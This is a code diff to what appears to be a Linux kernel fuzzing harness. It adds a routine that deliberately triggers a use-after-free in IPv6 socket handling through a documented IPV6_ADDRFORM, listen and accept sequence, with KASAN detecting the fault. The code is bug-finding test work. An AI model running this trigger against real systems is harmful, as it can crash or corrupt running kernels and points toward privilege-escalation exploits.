@@ -93,6 +93,10 @@
 #define IRR_WORKER_WALL_CAP_NS		(300L * 1000L * 1000L)
 #define IRR_OUTER_BASE			2U
 #define IRR_OUTER_CAP			4U
+/* Fixed port for the temporary AF_INET acceptor that the ADDRFORM arm
+ * connects to in step 2.  Sits outside the [PORT_BASE..PORT_BASE+POOL)
+ * range so it never conflicts with the race workers. */
+#define IRR_ADDRFORM_HELPER_PORT	(IRR_PORT_BASE + IRR_PORT_POOL + 3U)
 
 /* Latched once per process on EAFNOSUPPORT / EACCES / EPROTONOSUPPORT
  * from the bare socket() probe -- means TCP is unusable in this net
@@ -401,6 +405,172 @@ static __attribute__((noreturn)) void rehash_worker(uint16_t port)
 	_exit(0);
 }
 
+/*
+ * IPV6_ADDRFORM sequential arm.
+ *
+ * Drives the seven-step sequence that exposes the ipv6_pinfo UAF:
+ *
+ *   1. socket(AF_INET6, SOCK_STREAM) -- no IPV6_V6ONLY
+ *   2. connect() to ::ffff:127.0.0.1 via a short-lived AF_INET acceptor,
+ *      reaching ESTABLISHED with a v4-mapped sk_v6_daddr
+ *   3. setsockopt(IPPROTO_IPV6, IPV6_ADDRFORM, PF_INET) -- counts
+ *      addrform_returned_zero on success (the only live-arm signal)
+ *   4. connect(AF_UNSPEC) -- TCP_CLOSE / disconnect
+ *   5. listen(64) on the same fd
+ *   6. one AF_INET client SYN + accept() child
+ *   7. close(listener) FIRST, then close(child) -- the ordering IS the bug
+ *
+ * Oracle: KASAN (inet6_cleanup_sock xchg over freed listener memory).
+ * Sequential, not a race; runs in the parent child-process context.
+ * Returns the number of syscalls issued so the caller can accumulate
+ * them into the direct_calls total.
+ */
+static unsigned long run_addrform_arm(void)
+{
+	int helper = -1, addrfd = -1, client = -1, child = -1;
+	struct sockaddr_in  helper_sin, client_sin;
+	struct sockaddr_in6 mapped_sin6;
+	struct sockaddr_storage local_ss;
+	socklen_t local_len;
+	int pf_inet = PF_INET;
+	int one     = 1;
+	unsigned long n = 0;
+
+	/* Phase 0: spin up a temporary AF_INET acceptor on the helper port.
+	 * The AF_INET6 addrfd will connect to it via ::ffff:127.0.0.1, which
+	 * the kernel routes through the IPv4 stack.  SO_REUSEADDR lets
+	 * concurrent child processes share the port without EADDRINUSE. */
+	addr_v4(&helper_sin, (uint16_t)IRR_ADDRFORM_HELPER_PORT);
+	helper = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+	n++;
+	if (helper < 0)
+		goto out;
+	(void)setsockopt(helper, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+	n++;
+	if (bind(helper, (struct sockaddr *)&helper_sin, sizeof(helper_sin)) < 0)
+		goto out;
+	n++;
+	if (listen(helper, 64) < 0)
+		goto out;
+	n++;
+
+	/* Step 1: socket(AF_INET6, SOCK_STREAM) -- deliberately no IPV6_V6ONLY
+	 * so the socket accepts v4-mapped addresses and the kernel sets
+	 * sk_v6_daddr to the v4-mapped form on connect(). */
+	addrfd = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
+	n++;
+	if (addrfd < 0)
+		goto out;
+
+	/* Step 2: connect() to ::ffff:127.0.0.1:HELPER_PORT.  This reaches
+	 * TCP_ESTABLISHED with a v4-mapped sk_v6_daddr, satisfying the
+	 * ipv6_only_sock() == false gate inside IPV6_ADDRFORM. */
+	memset(&mapped_sin6, 0, sizeof(mapped_sin6));
+	mapped_sin6.sin6_family = AF_INET6;
+	mapped_sin6.sin6_port   = htons((uint16_t)IRR_ADDRFORM_HELPER_PORT);
+	/* ::ffff:127.0.0.1 -- bytes 10-11 are 0xff, then the v4 address */
+	mapped_sin6.sin6_addr.s6_addr[10] = 0xff;
+	mapped_sin6.sin6_addr.s6_addr[11] = 0xff;
+	mapped_sin6.sin6_addr.s6_addr[12] = 127;
+	mapped_sin6.sin6_addr.s6_addr[15] = 1;
+	if (connect(addrfd, (struct sockaddr *)&mapped_sin6,
+		    sizeof(mapped_sin6)) < 0)
+		goto out;
+	n++;
+
+	/* Step 3: setsockopt(IPPROTO_IPV6, IPV6_ADDRFORM, PF_INET).
+	 * On success (ret == 0) the socket is converted to AF_INET and
+	 * ipv6_pinfo is detached.  addrform_returned_zero is the only way
+	 * to confirm the arm is live -- all four kernel gates fail silently
+	 * with a plain errno on mismatch, so counting zero-returns is the
+	 * sole liveness signal. */
+	if (setsockopt(addrfd, IPPROTO_IPV6, IPV6_ADDRFORM,
+		       &pf_inet, sizeof(pf_inet)) == 0)
+		__atomic_add_fetch(
+			&shm->stats.inet_listener_rehash_race.addrform_returned_zero,
+			1, __ATOMIC_RELAXED);
+	n++;
+
+	/* Step 4: connect(AF_UNSPEC) -- TCP_CLOSE / disconnect.  After this
+	 * the socket is TCP_CLOSE with its local port still assigned. */
+	{
+		struct sockaddr sa_unspec;
+		memset(&sa_unspec, 0, sizeof(sa_unspec));
+		sa_unspec.sa_family = AF_UNSPEC;
+		(void)connect(addrfd, &sa_unspec, sizeof(sa_unspec));
+		n++;
+	}
+
+	/* Step 5: listen(64) on the same fd.  The socket is TCP_CLOSE and
+	 * still bound to the ephemeral local port assigned during connect();
+	 * after ADDRFORM it is now AF_INET.  listen() drives
+	 * tcp_v4_syn_recv_sock()'s opt_child_init == NULL branch. */
+	if (listen(addrfd, 64) < 0)
+		goto out;
+	n++;
+
+	/* Step 6: discover the listening port via getsockname(), then
+	 * drive one SYN from an AF_INET client and accept() the child
+	 * socket.  The child inherits any ipv6_pinfo pointer that
+	 * ADDRFORM left dangling on the listener. */
+	local_len = sizeof(local_ss);
+	if (getsockname(addrfd, (struct sockaddr *)&local_ss, &local_len) < 0)
+		goto out;
+	n++;
+
+	{
+		uint16_t listen_port = 0;
+
+		if (local_ss.ss_family == AF_INET)
+			listen_port =
+				((struct sockaddr_in *)&local_ss)->sin_port;
+		else if (local_ss.ss_family == AF_INET6)
+			listen_port =
+				((struct sockaddr_in6 *)&local_ss)->sin6_port;
+		if (listen_port == 0)
+			goto out;
+
+		addr_v4(&client_sin, ntohs(listen_port));
+		client = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+		n++;
+		if (client < 0)
+			goto out;
+		if (connect(client, (struct sockaddr *)&client_sin,
+			    sizeof(client_sin)) < 0)
+			goto out;
+		n++;
+	}
+
+	child = accept4(addrfd, NULL, NULL, SOCK_CLOEXEC);
+	n++;
+	if (child < 0)
+		goto out;
+
+	__atomic_add_fetch(
+		&shm->stats.inet_listener_rehash_race.addrform_child_accepted,
+		1, __ATOMIC_RELAXED);
+
+	/* Step 7: close(listener) FIRST, then close(child).
+	 * This ordering is the bug trigger: inet6_cleanup_sock() on
+	 * listener close runs xchg(&np->pktoptions, ...) and
+	 * xchg(&np->opt, ...) over the listener's ipv6_pinfo, which the
+	 * accepted child still references.  KASAN catches the UAF write
+	 * when the child's cleanup later touches the same freed region. */
+	close(addrfd);
+	addrfd = -1;
+	n++;
+	close(child);
+	child = -1;
+	n++;
+
+out:
+	if (child  >= 0) { close(child);  n++; }
+	if (addrfd >= 0) { close(addrfd); n++; }
+	if (client >= 0) { close(client); n++; }
+	if (helper >= 0) { close(helper); n++; }
+	return n;
+}
+
 static void reap_worker(pid_t pid)
 {
 	int status;
@@ -496,6 +666,11 @@ static unsigned long run_one_round(void)
 	if (p_syn > 0) calls++;
 	reap_worker(p_rehash);
 	if (p_rehash > 0) calls++;
+
+	/* Sequential ADDRFORM arm: runs after the race workers have been
+	 * reaped so it does not share ports or timing with the race itself.
+	 * Contributes its own syscall count directly to this round's total. */
+	calls += run_addrform_arm();
 
 	return calls;
 }
